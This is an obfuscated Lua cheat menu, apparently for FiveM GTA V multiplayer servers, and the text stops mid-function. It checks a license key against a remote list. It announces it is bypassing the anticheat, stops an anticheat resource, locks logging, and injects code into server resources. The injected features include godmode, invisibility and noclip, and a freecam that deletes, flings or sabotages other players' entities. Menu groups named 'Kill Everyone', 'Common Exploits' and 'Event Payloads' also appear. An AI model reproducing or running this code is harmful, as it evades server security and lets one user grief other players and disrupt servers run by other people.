local v0="https://raw.githubusercontent.com/WM5M/test/refs/heads/main/wmk.json";local v1=MachoWebRequest(v0);local v2=MachoAuthenticationKey();local v3=true;local function v4(v73) if (type(v73)~="string") then return nil;end local v74,v75,v76,v77,v78,v79=string.match(v73,"(%d+)%-(%d+)%-(%d+)T(%d+):(%d+):(%d+)Z");if  not v74 then return nil;end return (tonumber(os_time) or (0 -0)) + 0 ;end local function v5() local v80=GetCloudTimeAsInt();if (v80 and (v80>0)) then return v80;end return 833 -(95 + 738) ;end local function v6(v81) local v82=0;local v83;local v84;local v85;local v86;local v87;local v88;local v89;local v90;while true do if (v82==(701 -(271 + 429))) then v89=((tonumber(v83) -(1810 + 160)) * (1865 -(1408 + 92))) + math.floor((tonumber(v83) -1969)/(1090 -(461 + 625)) ) + ((tonumber(v84) -(1289 -(993 + 295))) * (2 + 28)) + tonumber(v85 or (1172 -(418 + 753)) ) ;v90=(v89 * 86400) + (tonumber(v86 or 0 ) * 3600) + (tonumber(v87 or (0 + 0) ) * (7 + 53)) + tonumber(v88 or (0 + 0) ) ;v82=1 + 1 ;end if (v82==0) then v83,v84,v85,v86,v87,v88=string.match(v81,"(%d+)%-(%d+)%-(%d+)T(%d+):(%d+):(%d+)Z");if  not v83 then return nil;end v82=530 -(406 + 123) ;end if (v82==2) then return v90;end end end local function v7() local v91=1769 -(1749 + 20) ;local v92;local v93;local v94;while true do if (v91==(1 + 0)) then if ( not v92 or  not v93 or (type(v93)~="table")) then return false,"Key list invalid";end v94=v5();v91=1324 -(1249 + 73) ;end if (v91==(1 + 1)) then for v349,v350 in ipairs(v93) do if ((type(v350)=="table") and (v350.key==v2)) then if (v350.expires and (type(v350.expires)=="string")) then local v411=v6(v350.expires);if  not v411 then return false,"Bad expiry format";end if (v411>v94) then return true,"Key valid (not expired)",v411;else return false,"Key expired",v411;end elseif v3 then return false,"Key missing expiry (strict mode)";else return true,"Key valid (no expiry field)";end end end return false,"Key not found";end if (v91==(1145 -(466 + 679))) then if  not v1 then return false,"No key list available";end v92,v93=pcall(json.decode,v1);v91=2 -1 ;end end end local v8,v9,v10=v7();if  not v8 then MachoMenuNotification("WizeMenu","Invalid key: "   .. tostring(v2)   .. " ("   .. tostring(v9)   .. ")" ,28 -18 );return;end Citizen.CreateThread(function() if (v10 and (v10>(1900 -(106 + 1794)))) then local v280=0 + 0 ;local v281;local v282;while true do if (v280==(0 + 0)) then v281=v5();v282=v10-v281 ;v280=2 -1 ;end if (v280==(2 -1)) then if (v282>(114 -(4 + 110))) then local v396=584 -(57 + 527) ;local v397;local v398;local v399;while true do if (v396==(1427 -(41 + 1386))) then v397=math.floor(v282/(86503 -(17 + 86)) );v398=math.floor((v282%(58640 + 27760))/(8028 -4428) );v396=1;end if (v396==(2 -1)) then v399=string.format("Key valid. Expires in %d days and %d hours.",v397,v398);MachoMenuNotification("WizeMenu",v399,171 -(122 + 44) );break;end end else MachoMenuNotification("WizeMenu","Key expired.",17 -7 );end break;end end else MachoMenuNotification("WizeMenu","Key valid (no expiry field).",5);end end);local v11=vec2(750,500);local v12=vec2(1658 -1158 ,407 + 93 );local v13=22 + 128 ;local v14=20 -10 ;local v15=80 -(30 + 35) ;local v16=v11.x-v13 ;local v17=v11.y-(2 * v14) ;local v18=(v16-(v14 * (3 + 0)))/2 ;local v19=(v17-(v14 * (1260 -(1043 + 214))))/(7 -5) ;local v20=MachoMenuTabbedWindow("WizeVIP",v12.x,v12.y,v11.x,v11.y,v13);MachoMenuSetKeybind(v20,33);MachoMenuSetAccent(v20,1419 -(323 + 889) ,42 -26 ,32);MachoMenuText(v20,"YT @JayThaaGamer");local v21=MachoMenuAddTab(v20,"Self");local v22=MachoMenuAddTab(v20,"Server");local v23=MachoMenuAddTab(v20,"Teleport");local v24=MachoMenuAddTab(v20,"Weapon");local v25=MachoMenuAddTab(v20,"Vehicle");local v26=MachoMenuAddTab(v20,"Animations");local v27=MachoMenuAddTab(v20,"Triggers");local v28=MachoMenuAddTab(v20,"Settings");local v29=MachoMenuAddTab(v20,"VIP");local function v30(v95) local v96=v13 + v14 ;local v97=v14 + v15 ;local v98=v97 + v19 + v14 ;local v99=v96 + v18 + v14 ;local v100=(v19 * (582 -(361 + 219))) + v14 ;local v101=MachoMenuGroup(v95,"Self",v96,v97,v96 + v18 ,v97 + v100 );local v102=MachoMenuGroup(v95,"Model Changer",v99,v97,v99 + v18 ,v97 + v19 );local v103=MachoMenuGroup(v95,"Functions",v99,v98,v99 + v18 ,v98 + v19 );return v101,v102,v103;end local function v31(v104) local v105=320 -(53 + 267) ;local v106;local v107;local v108;local v109;local v110;local v111;local v112;while true do if (v105==(1 + 2)) then v112=MachoMenuGroup(v104,"Everyone",v110,v14 + v15 ,v111,v17);return v109,v112;end if (1==v105) then v108=v107 + v106 ;v109=MachoMenuGroup(v104,"Player",v107,v14 + v15 ,v108,v17);v105=415 -(15 + 398) ;end if (v105==(982 -(18 + 964))) then v106=(v16-(v14 * 3))/(7 -5) ;v107=v13 + v14 ;v105=1 + 0 ;end if (v105==2) then v110=v108 + v14 ;v111=v110 + v106 ;v105=3;end end end local function v32(v113) local v114=0 + 0 ;local v115;local v116;local v117;local v118;local v119;local v120;local v121;while true do if ((850 -(20 + 830))==v114) then v115=(v16-(v14 * (3 + 0)))/(128 -(116 + 10)) ;v116=v13 + v14 ;v114=1;end if ((1 + 1)==v114) then v119=v117 + v14 ;v120=v119 + v115 ;v114=3;end if (v114==(741 -(542 + 196))) then v121=MachoMenuGroup(v113,"Other",v119,v14 + v15 ,v120,v17);return v118,v121;end if (v114==(1 -0)) then v117=v116 + v115 ;v118=MachoMenuGroup(v113,"Teleport",v116,v14 + v15 ,v117,v17);v114=2;end end end local function v33(v122) local v123=0 + 0 ;local v124;local v125;local v126;local v127;local v128;local v129;local v130;while true do if (v123==3) then v130=MachoMenuGroup(v122,"Other",v129,v14 + v15 ,v129 + v18 ,v17);return v127,v128,v130;end if (v123==(2 + 0)) then v128=MachoMenuGroup(v122,"Spawner",v124,v126,v124 + v18 ,v126 + v19 );v129=v124 + v18 + v14 ;v123=2 + 1 ;end if (v123==0) then v124=v13 + v14 ;v125=v14 + v15 ;v123=2 -1 ;end if (v123==(2 -1)) then v126=v125 + v19 + v14 ;v127=MachoMenuGroup(v122,"Mods",v124,v125,v124 + v18 ,v125 + v19 );v123=1553 -(1126 + 425) ;end end end local function v34(v131) local v132=405 -(118 + 287) ;local v133;local v134;local v135;local v136;local v137;local v138;local v139;while true do if (v132==(7 -5)) then v137=MachoMenuGroup(v131,"Plate & Spawning",v133,v135,v133 + v18 ,v135 + v19 );v138=v133 + v18 + v14 ;v132=1124 -(118 + 1003) ;end if (v132==0) then v133=v13 + v14 ;v134=v14 + v15 ;v132=1;end if (v132==3) then v139=MachoMenuGroup(v131,"Other",v138,v14 + v15 ,v138 + v18 ,v17);return v136,v137,v139;end if (v132==1) then v135=v134 + v19 + v14 ;v136=MachoMenuGroup(v131,"Mods",v133,v134,v133 + v18 ,v134 + v19 );v132=2;end end end local function v35(v140) local v141=(v16-(v14 * 3))/(5 -3) ;local v142=v13 + v14 ;local v143=v142 + v141 ;local v144=MachoMenuGroup(v140,"Animations",v142,v14 + v15 ,v143,v17);local v145=v143 + v14 ;local v146=v145 + v141 ;local v147=MachoMenuGroup(v140,"Force Emotes",v145,v14 + v15 ,v146,v17);return v144,v147;end local function v36(v148) local v149=v13 + v14 ;local v150=v14 + v15 ;local v151=v150 + v19 + v14 ;local v152=MachoMenuGroup(v148,"Item Spawner",v149,v151,v149 + v18 ,v150 + v19 );local v153=MachoMenuGroup(v148,"Money Spawner",v149,v150,v149 + v18 ,v150 + v19 );local v154=v149 + v18 + v14 ;local v155=MachoMenuGroup(v148,"Common Exploits",v154,v150,v154 + v18 ,v150 + v19 );local v156=MachoMenuGroup(v148,"Event Payloads",v154,v151,v154 + v18 ,v151 + v19 );return v152,v153,v155,v156;end local function v37(v157) local v158=377 -(142 + 235) ;local v159;local v160;local v161;local v162;local v163;local v164;local v165;while true do if (v158==1) then v161=v160 + v19 + v14 ;v162=MachoMenuGroup(v157,"Trigger Finder Spawner",v159,v160,v159 + v18 ,v160 + v19 );v158=2;end if (v158==(0 -0)) then v159=v13 + v14 ;v160=v14 + v15 ;v158=1 + 0 ;end if (v158==(980 -(553 + 424))) then v165=MachoMenuGroup(v157,"Common Exploits V2",v164,v14 + v15 ,v164 + v18 ,v17);return v162,v163,v165;end if (v158==(3 -1)) then v163=MachoMenuGroup(v157,"Common Exploits",v159,v161,v159 + v18 ,v161 + v19 );v164=v159 + v18 + v14 ;v158=3 + 0 ;end end end local function v38(v166) local v167=0 + 0 ;local v168;local v169;local v170;local v171;local v172;local v173;local v174;while true do if (v167==2) then v172=MachoMenuGroup(v166,"Menu Design",v168,v170,v168 + v18 ,v170 + v19 );v173=v168 + v18 + v14 ;v167=3;end if (v167==0) then v168=v13 + v14 ;v169=v14 + v15 ;v167=1 + 0 ;end if (v167==(1 + 0)) then v170=v169 + v19 + v14 ;v171=MachoMenuGroup(v166,"Stop",v168,v169,v168 + v18 ,v169 + v19 );v167=2 + 0 ;end if (v167==(6 -3)) then v174=MachoMenuGroup(v166,"Server Settings",v173,v14 + v15 ,v173 + v18 ,v17);return v171,v172,v174;end end end local v39={v30(v21)};local v40={v31(v22)};local v41={v32(v23)};local v42={v33(v24)};local v43={v34(v25)};local v44={v35(v26)};local v45={v36(v27)};local v46={v37(v29)};local v47={v38(v28)};local function v48(v175) return GetResourceState(v175)=="started" ;end local function v49() Wait(1500);Wait(223 -123 );MachoMenuNotification("[NOTIFICATION] WizeMenu","Bypassing FiveTard.");local function v176() local function v257(v283,v284) local v285=LoadResourceFile(v283,v284);return v285~=nil ;end local v258="ai_module_fg-obfuscated.lua";local v259=GetNumResources();for v286=0 + 0 ,v259-(4 -3)  do local v287=GetResourceByFindIndex(v286);if v257(v287,v258) then return true,v287;end end return false,nil;end Wait(853 -(239 + 514) );local v177,v178=v176();if (v177 and v178) then MachoResourceStop(v178);end Wait(100);MachoMenuNotification("[NOTIFICATION] WizeMenu","Almost done.");Wait(176 + 324 );MachoMenuNotification("[NOTIFICATION] WizeMenu","Finished Enjoy.");end v49();local v50;if (GetResourceState("qbx_core")=="started") then v50="qbx_core";elseif (GetResourceState("es_extended")=="started") then v50="es_extended";elseif (GetResourceState("qb-core")=="started") then v50="qb-core";else v50="any";end Citizen.CreateThread(function() local v179=1329 -(797 + 532) ;while true do if ((0 + 0)==v179) then MachoMenuNotification("[NOTIFICATION] WizeMenu","Spawn Shit Now!");Wait(169 + 331 );v179=2 -1 ;end if (v179==1) then MachoMenuNotification("[NOTIFICATION] WizeMenu","O_o!");break;end end end);MachoLockLogger();MachoInjectResource((v48("core") and "core") or (v48("es_extended") and "es_extended") or (v48("qb-core") and "qb-core") or (v48("monitor") and "monitor") or "any" ,[[
        local xJdRtVpNzQmKyLf = false -- Free Camera
    ]]);MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
        Unloaded = false
        local aXfPlMnQwErTyUi = false -- Godmode
        local sRtYuIoPaSdFgHj = false -- Invisibility
        local mKjHgFdSaPlMnBv = false -- No Ragdoll
        local uYtReWqAzXcVbNm = false -- Infinite Stamina
        local peqCrVzHDwfkraYZ = false -- Shrink Ped
        local NpYgTbUcXsRoVm = false -- No Clip
        local xCvBnMqWeRtYuIo = false -- Super Jump
        local nxtBFlQWMMeRLs = false -- Levitation
        local fgawjFmaDjdALaO = false -- Super Strength
        local qWeRtYuIoPlMnBv = false -- Super Punch
        local zXpQwErTyUiPlMn = false -- Throw From Vehicle
        local kJfGhTrEeWqAsDz = false -- Force Third Person
        local zXcVbNmQwErTyUi = false -- Force Driveby
        local yHnvrVNkoOvGMWiS = false -- Anti-Headshot
        local nHgFdSaZxCvBnMq = false -- Anti-Freeze
        local fAwjeldmwjrWkSf = false -- Anti-TP
        local aDjsfmansdjwAEl = false -- Anti-Blackscreen
        local qWpEzXvBtNyLmKj = false -- Crosshair

        local egfjWADmvsjAWf = false -- Spoofed Weapon Spawning
        local LkJgFdSaQwErTy = false -- Infinite Ammo
        local QzWxEdCvTrBnYu = false -- Explosive Ammo
        local RfGtHyUjMiKoLp = false -- One Shot Kill 

        local zXcVbNmQwErTyUi = false -- Vehicle Godmode
        local RNgZCddPoxwFhmBX = false -- Force Vehicle Engine
        local PlAsQwErTyUiOp = false -- Vehicle Auto Repair
        local LzKxWcVbNmQwErTy = false -- Freeze Vehicle
        local NuRqVxEyKiOlZm = false -- Vehicle Hop
        local GxRpVuNzYiTq = false -- Rainbow Vehicle
        local MqTwErYuIoLp = false -- Drift Mode
        local NvGhJkLpOiUy = false -- Easy Handling
        local VkLpOiUyTrEq = false -- Instant Breaks
        local BlNkJmLzXcVb = false -- Unlimited Fuel

        local aSwDeFgHiJkLoPx = false -- Normal Kill Everyone
        local qWeRtYuIoPlMnAb = false -- Permanent Kill Everyone
        local tUOgshhvIaku = false -- RPG Kill Everyone
        local zXcVbNmQwErTyUi = false -- 
    ]]);MachoMenuCheckbox(v39[1203 -(373 + 829) ],"Godmode",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if aXfPlMnQwErTyUi == nil then aXfPlMnQwErTyUi = false end
            aXfPlMnQwErTyUi = true

            local function OxWJ1rY9vB()
                local fLdRtYpLoWqEzXv = CreateThread
                fLdRtYpLoWqEzXv(function()
                    while aXfPlMnQwErTyUi and not Unloaded do
                        local dOlNxGzPbTcQ = PlayerPedId()
                        local rKsEyHqBmUiW = PlayerId()

                        if GetResourceState("ReaperV4") == "started" then
                            local kcWsWhJpCwLI = SetPlayerInvincible
                            local ByTqMvSnAzXd = SetEntityInvincible
                            kcWsWhJpCwLI(rKsEyHqBmUiW, true)
                            ByTqMvSnAzXd(dOlNxGzPbTcQ, true)

                        elseif GetResourceState("WaveShield") == "started" then
                            local cvYkmZYIjvQQ = SetEntityCanBeDamaged
                            cvYkmZYIjvQQ(dOlNxGzPbTcQ, false)

                        else
                            local BiIqUJHexRrR = SetEntityCanBeDamaged
                            local UtgGRNyiPhOs = SetEntityProofs
                            local rVuKoDwLsXpC = SetEntityInvincible

                            BiIqUJHexRrR(dOlNxGzPbTcQ, false)
                            UtgGRNyiPhOs(dOlNxGzPbTcQ, true, true, true, false, true, false, false, false)
                            rVuKoDwLsXpC(dOlNxGzPbTcQ, true)
                        end

                        Wait(0)
                    end
                end)
            end

            OxWJ1rY9vB()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            aXfPlMnQwErTyUi = false

            local dOlNxGzPbTcQ = PlayerPedId()
            local rKsEyHqBmUiW = PlayerId()

            if GetResourceState("ReaperV4") == "started" then
                local kcWsWhJpCwLI = SetPlayerInvincible
                local ByTqMvSnAzXd = SetEntityInvincible

                kcWsWhJpCwLI(rKsEyHqBmUiW, false)
                ByTqMvSnAzXd(dOlNxGzPbTcQ, false)

            elseif GetResourceState("WaveShield") == "started" then
                local AilJsyZTXnNc = SetEntityCanBeDamaged
                AilJsyZTXnNc(dOlNxGzPbTcQ, true)

            else
                local tBVAZMubUXmO = SetEntityCanBeDamaged
                local yuTiZtxOXVnE = SetEntityProofs
                local rVuKoDwLsXpC = SetEntityInvincible

                tBVAZMubUXmO(dOlNxGzPbTcQ, true)
                yuTiZtxOXVnE(dOlNxGzPbTcQ, false, false, false, false, false, false, false, false)
                rVuKoDwLsXpC(dOlNxGzPbTcQ, false)
            end
        ]]);end);MachoMenuCheckbox(v39[732 -(476 + 255) ],"Invisibility",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if sRtYuIoPaSdFgHj == nil then sRtYuIoPaSdFgHj = false end
            sRtYuIoPaSdFgHj = true

            local function d2NcWoyTfb()
                if sRtYuIoPaSdFgHj == nil then sRtYuIoPaSdFgHj = false end
                sRtYuIoPaSdFgHj = true

                local zXwCeVrBtNuMyLk = CreateThread
                zXwCeVrBtNuMyLk(function()
                    while sRtYuIoPaSdFgHj and not Unloaded do
                        local uYiTpLaNmZxCwEq = SetEntityVisible
                        local hGfDrEsWxQaZcVb = PlayerPedId()
                        uYiTpLaNmZxCwEq(hGfDrEsWxQaZcVb, false, false)
                        Wait(0)
                    end

                    local uYiTpLaNmZxCwEq = SetEntityVisible
                    local hGfDrEsWxQaZcVb = PlayerPedId()
                    uYiTpLaNmZxCwEq(hGfDrEsWxQaZcVb, true, false)
                end)
            end

            d2NcWoyTfb()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            sRtYuIoPaSdFgHj = false

            local function tBKM4syGJL()
                local uYiTpLaNmZxCwEq = SetEntityVisible
                local hGfDrEsWxQaZcVb = PlayerPedId()
                uYiTpLaNmZxCwEq(hGfDrEsWxQaZcVb, true, false)
            end

            tBKM4syGJL()
        ]]);end);MachoMenuCheckbox(v39[1131 -(369 + 761) ],"No Ragdoll",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if mKjHgFdSaPlMnBv == nil then mKjHgFdSaPlMnBv = false end
            mKjHgFdSaPlMnBv = true

            local function jP7xUrK9Ao()
                local zVpLyNrTmQxWsEd = CreateThread
                zVpLyNrTmQxWsEd(function()
                    while mKjHgFdSaPlMnBv and not Unloaded do
                        local oPaSdFgHiJkLzXc = SetPedCanRagdoll
                        oPaSdFgHiJkLzXc(PlayerPedId(), false)
                        Wait(0)
                    end
                end)
            end

            jP7xUrK9Ao()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            mKjHgFdSaPlMnBv = false
        ]]);end);MachoMenuCheckbox(v39[1 + 0 ],"Infinite Stamina",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if uYtReWqAzXcVbNm == nil then uYtReWqAzXcVbNm = false end
            uYtReWqAzXcVbNm = true

            local function YLvd3pM0tB()
                local tJrGyHnMuQwSaZx = CreateThread
                tJrGyHnMuQwSaZx(function()
                    while uYtReWqAzXcVbNm and not Unloaded do
                        local aSdFgHjKlQwErTy = RestorePlayerStamina
                        local rTyUiEaOpAsDfGhJk = PlayerId()
                        aSdFgHjKlQwErTy(rTyUiEaOpAsDfGhJk, 1.0)
                        Wait(0)
                    end
                end)
            end

            YLvd3pM0tB()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            uYtReWqAzXcVbNm = false
        ]]);end);MachoMenuCheckbox(v39[1 -0 ],"Tiny Ped",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if peqCrVzHDwfkraYZ == nil then peqCrVzHDwfkraYZ = false end
            peqCrVzHDwfkraYZ = true

            local function YfeemkaufrQjXTFY()
                local OLZACovzmAvgWPmC = CreateThread
                OLZACovzmAvgWPmC(function()
                    while peqCrVzHDwfkraYZ and not Unloaded do
                        local aukLdkvEinBsMWuA = SetPedConfigFlag
                        aukLdkvEinBsMWuA(PlayerPedId(), 223, true)
                        Wait(0)
                    end
                end)
            end

            YfeemkaufrQjXTFY()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            peqCrVzHDwfkraYZ = false
            local aukLdkvEinBsMWuA = SetPedConfigFlag
            aukLdkvEinBsMWuA(PlayerPedId(), 223, false)
        ]]);end);MachoMenuCheckbox(v39[1 -0 ],"No Clip",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if NpYgTbUcXsRoVm == nil then NpYgTbUcXsRoVm = false end
            NpYgTbUcXsRoVm = true

            local function KUQpH7owdz()
                local RvBcNxMzKgUiLo = PlayerPedId
                local EkLpOiUhYtGrFe = GetVehiclePedIsIn
                local CtVbXnMzQaWsEd = GetEntityCoords
                local DrTgYhUjIkOlPm = GetEntityHeading
                local QiWzExRdCtVbNm = GetGameplayCamRelativeHeading
                local AoSdFgHjKlZxCv = GetGameplayCamRelativePitch
                local JkLzXcVbNmAsDf = IsDisabledControlJustPressed
                local TyUiOpAsDfGhJk = IsDisabledControlPressed
                local WqErTyUiOpAsDf = SetEntityCoordsNoOffset
                local PlMnBvCxZaSdFg = SetEntityHeading
                local HnJmKlPoIuYtRe = CreateThread

                local YtReWqAzXsEdCv = false

                HnJmKlPoIuYtRe(function()
                    while NpYgTbUcXsRoVm and not Unloaded do
                        Wait(0)

                        if JkLzXcVbNmAsDf(0, 303) then
                            YtReWqAzXsEdCv = not YtReWqAzXsEdCv
                        end

                        if YtReWqAzXsEdCv then
                            local speed = 2.0

                            local p = RvBcNxMzKgUiLo()
                            local v = EkLpOiUhYtGrFe(p, false)
                            local inVeh = v ~= 0 and v ~= nil
                            local ent = inVeh and v or p

                            local pos = CtVbXnMzQaWsEd(ent, true)
                            local head = QiWzExRdCtVbNm() + DrTgYhUjIkOlPm(ent)
                            local pitch = AoSdFgHjKlZxCv()

                            local dx = -math.sin(math.rad(head))
                            local dy = math.cos(math.rad(head))
                            local dz = math.sin(math.rad(pitch))
                            local len = math.sqrt(dx * dx + dy * dy + dz * dz)

                            if len ~= 0 then
                                dx, dy, dz = dx / len, dy / len, dz / len
                            end

                            if TyUiOpAsDfGhJk(0, 21) then speed = speed + 2.5 end
                            if TyUiOpAsDfGhJk(0, 19) then speed = 0.25 end

                            if TyUiOpAsDfGhJk(0, 32) then
                                pos = pos + vector3(dx, dy, dz) * speed
                            end
                            if TyUiOpAsDfGhJk(0, 34) then
                                pos = pos + vector3(-dy, dx, 0.0) * speed
                            end
                            if TyUiOpAsDfGhJk(0, 269) then
                                pos = pos - vector3(dx, dy, dz) * speed
                            end
                            if TyUiOpAsDfGhJk(0, 9) then
                                pos = pos + vector3(dy, -dx, 0.0) * speed
                            end
                            if TyUiOpAsDfGhJk(0, 22) then
                                pos = pos + vector3(0.0, 0.0, speed)
                            end
                            if TyUiOpAsDfGhJk(0, 36) then
                                pos = pos - vector3(0.0, 0.0, speed)
                            end

                            WqErTyUiOpAsDf(ent, pos.x, pos.y, pos.z, true, true, true)
                            PlMnBvCxZaSdFg(ent, head)
                        end
                    end
                    YtReWqAzXsEdCv = false
                end)
            end

            KUQpH7owdz()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            NpYgTbUcXsRoVm = false
        ]]);end);MachoMenuCheckbox(v39[239 -(64 + 174) ],"Free Camera",function() MachoInjectResource((v48("core") and "core") or (v48("es_extended") and "es_extended") or (v48("qb-core") and "qb-core") or (v48("monitor") and "monitor") or "any" ,[[
            
            g_FreecamFeatureEnabled = true
            
            local function initializeFreecam()
                -- Script State
                local isFreecamActive = false
                local freecamHandle = nil
                local targetCoords, targetEntity = nil, nil
                local currentFeatureIndex = 1

                -- NEW FEATURE: Ped Spawning State
                local pedsToSpawn = { "s_m_m_movalien_01", "u_m_y_zombie_01", "s_m_y_blackops_01", "csb_abigail", "a_c_coyote" }
                local currentPedIndex = 1

                local stopFreecam, startFreecam

                -- Feature Definitions (Now with Ped Spawner)
                local Features = { 
                    "Look-Around", 
                    "Spawn Ped",         -- ADDED
                    "Teleport", 
                    "Delete Entity", 
                    "Fling Entity", 
                    "Flip Vehicle", 
                    "Launch Vehicle",
                    "Teleport Vehicle",
                    "Mess With Vehicle"
                }

                -- Helper Function for Drawing Text
                local function drawText(content, x, y, options)
                    SetTextFont(options.font or 4)
                    SetTextScale(0.0, options.scale or 0.3)
                    SetTextColour(options.color[1], options.color[2], options.color[3], options.color[4])
                    SetTextOutline()
                    if options.shadow then SetTextDropShadow(2, 0, 0, 0, 255) end
                    SetTextCentre(true)
                    BeginTextCommandDisplayText("STRING")
                    AddTextComponentSubstringPlayerName(content)
                    EndTextCommandDisplayText(x, y)
                end

                -- Main Draw Thread (UI Only)
                local function drawThread()
                    while isFreecamActive do
                        Wait(0)
                        -- Draw Crosshair
                        drawText("•", 0.5, 0.485, {font = 4, scale = 0.5, color = {255,255,255,200}})
                        
                        -- ##### UI FIX: SCROLLING MENU LOGIC #####
                        local ui = { x = 0.5, y = 0.75, lineHeight = 0.03, maxVisible = 7, colors = { text = {245, 245, 245, 120}, selected = {52, 152, 219, 255} } }
                        local numFeatures = #Features
                        local startIdx, endIdx = 1, numFeatures

                        if numFeatures > ui.maxVisible then
                            startIdx = math.max(1, currentFeatureIndex - math.floor(ui.maxVisible / 2))
                            endIdx = math.min(numFeatures, startIdx + ui.maxVisible - 1)
                            if endIdx == numFeatures then
                                startIdx = numFeatures - ui.maxVisible + 1
                            end
                        end

                        -- Draw a counter above the list
                        drawText(("%d/%d"):format(currentFeatureIndex, numFeatures), ui.x, ui.y - 0.035, {scale = 0.25, color = {255,255,255,120}})

                        local displayCount = 0
                        for i = startIdx, endIdx do
                            local featureName = Features[i]
                            local isSelected = (i == currentFeatureIndex)
                            local lineY = ui.y + (displayCount * ui.lineHeight)
                            if isSelected then
                                drawText(("[ %s ]"):format(featureName), ui.x, lineY, {scale = 0.32, color = ui.colors.selected, shadow = true})
                            else
                                drawText(featureName, ui.x, lineY, {scale = 0.28, color = ui.colors.text})
                            end
                            displayCount = displayCount + 1
                        end
                    end
                end

                -- Main Input and Logic Thread
                local function logicThread()
                    while isFreecamActive do
                        Wait(0)
                        if IsDisabledControlJustPressed(0, 241) then currentFeatureIndex = (currentFeatureIndex - 2 + #Features) % #Features + 1 elseif IsDisabledControlJustPressed(0, 242) then currentFeatureIndex = (currentFeatureIndex % #Features) + 1 end
                        
                        if IsDisabledControlJustPressed(0, 24) then -- Action Key Pressed
                            local currentFeature = Features[currentFeatureIndex]
                            if currentFeature == "Teleport" and targetCoords then
                                local ped = PlayerPedId()
                                local _, z = GetGroundZFor_3dCoord(targetCoords.x, targetCoords.y, targetCoords.z + 1.0, false)
                                SetEntityCoords(ped, targetCoords.x, targetCoords.y, z and z + 1.0 or targetCoords.z, false, false, false, true)
                            -- ##### NEW FEATURE: SAFE PED SPAWNER LOGIC #####
                            elseif currentFeature == "Spawn Ped" and targetCoords then
                                local model = pedsToSpawn[currentPedIndex]
                                CreateThread(function()
                                    local modelHash = GetHashKey(model)
                                    RequestModel(modelHash)
                                    local timeout = 2000 -- 2 second timeout for model loading
                                    while not HasModelLoaded(modelHash) and timeout > 0 do
                                        Wait(100)
                                        timeout = timeout - 100
                                    end
                                    if HasModelLoaded(modelHash) then
                                        local _, z = GetGroundZFor_3dCoord(targetCoords.x, targetCoords.y, targetCoords.z, false)
                                        local spawnPos = vector3(targetCoords.x, targetCoords.y, z and z + 1.0 or targetCoords.z)
                                        local newPed = CreatePed(4, modelHash, spawnPos.x, spawnPos.y, spawnPos.z, 0.0, true, true)
                                        SetModelAsNoLongerNeeded(modelHash)
                                        TaskStandStill(newPed, -1) -- Make them stand still
                                        currentPedIndex = (currentPedIndex % #pedsToSpawn) + 1 -- Cycle to the next ped for next time
                                    end
                                end)
                            elseif currentFeature == "Delete Entity" and targetEntity and DoesEntityExist(targetEntity) then
                                SetEntityAsMissionEntity(targetEntity, true, true)
                                DeleteEntity(targetEntity)
                            elseif currentFeature == "Fling Entity" and targetEntity and (IsEntityAPed(targetEntity) or IsEntityAVehicle(targetEntity)) then
                                ApplyForceToEntity(targetEntity, 1, math.random(-50.0, 50.0), math.random(-50.0, 50.0), 50.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)
                            elseif currentFeature == "Flip Vehicle" and targetEntity and IsEntityAVehicle(targetEntity) then
                                SetVehicleOnGroundProperly(targetEntity)
                            elseif currentFeature == "Launch Vehicle" and targetEntity and IsEntityAVehicle(targetEntity) then
                                ApplyForceToEntity(targetEntity, 1, 0.0, 0.0, 100.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)
                            elseif currentFeature == "Teleport Vehicle" and targetEntity and IsEntityAVehicle(targetEntity) then
                                local currentCoords = GetEntityCoords(targetEntity)
                                local newCoords = currentCoords + GetEntityForwardVector(targetEntity) * 5.0 + vector3(0.0, 0.0, 50.0)
                                SetEntityCoords(targetEntity, newCoords.x, newCoords.y, newCoords.z, false, false, false, true)
                            elseif currentFeature == "Mess With Vehicle" and targetEntity and IsEntityAVehicle(targetEntity) then
                                local actions = {
                                    function(veh) SetVehicleTyreBurst(veh, math.random(0, 5), false, 1000.0) end,
                                    function(veh) SetVehicleDoorOpen(veh, math.random(0, 5), false, false) end,
                                    function(veh) SetVehicleEngineOn(veh, not IsVehicleEngineOn(veh), false, true) end,
                                    function(veh) SetVehicleLights(veh, math.random(0, 2)) end,
                                    function(veh) StartVehicleHorn(veh, 1000, "HELDDOWN", false) end
                                }
                                local randomAction = actions[math.random(#actions)]
                                randomAction(targetEntity)
                            end
                        end
                    end
                end

                -- Main Camera Movement Thread (Unchanged)
                local function cameraThread()
                    local baseSpeed, boostSpeed, slowSpeed = 1.0, 9.0, 0.1; local mouseSensitivity = 7.5; local function clamp(val, min, max) return math.max(min, math.min(max, val)) end; local function rotToDir(rot) local rX, rZ = math.rad(rot.x), math.rad(rot.z); return vector3(-math.sin(rZ)*math.cos(rX), math.cos(rZ)*math.cos(rX), math.sin(rX)) end;
                    while isFreecamActive do
                        Wait(0)
                        local camPos, camRotRaw = GetCamCoord(freecamHandle), GetCamRot(freecamHandle, 2); local camRot = { x = camRotRaw.x, y = camRotRaw.y, z = camRotRaw.z }; local direction = rotToDir(camRot); local right = vector3(direction.y, -direction.x, 0)
